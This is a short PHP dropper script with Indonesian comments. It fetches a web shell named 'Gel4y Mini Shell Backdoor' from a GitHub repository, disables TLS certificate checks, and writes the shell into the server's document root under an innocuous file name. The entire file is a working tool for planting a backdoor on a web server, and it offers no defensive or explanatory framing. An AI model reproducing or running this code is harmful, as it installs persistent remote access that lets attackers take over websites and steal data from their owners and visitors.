<?php

$file_name = "namamu.php"; // Nama file 
$file_url = "https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/refs/heads/1.x.x/gel4y.php"; // URL 

// Mendeteksi home root secara otomatis
$save_directory = $_SERVER['DOCUMENT_ROOT'] . "/"; 

if (!is_dir($save_directory)) {
    die("Direktori tujuan tidak ditemukan atau tidak dapat diakses.");
}

$save_path = $save_directory . $file_name;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $file_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$file_content = curl_exec($ch);

if ($file_content === false) {
    die("Download gagal: " . curl_error($ch));
}

curl_close($ch);

if (file_put_contents($save_path, $file_content) !== false) {
    echo "File berhasil diunduh dan disimpan di: " . $save_path;
} else {
    echo "Gagal menyimpan file.";
}
?>
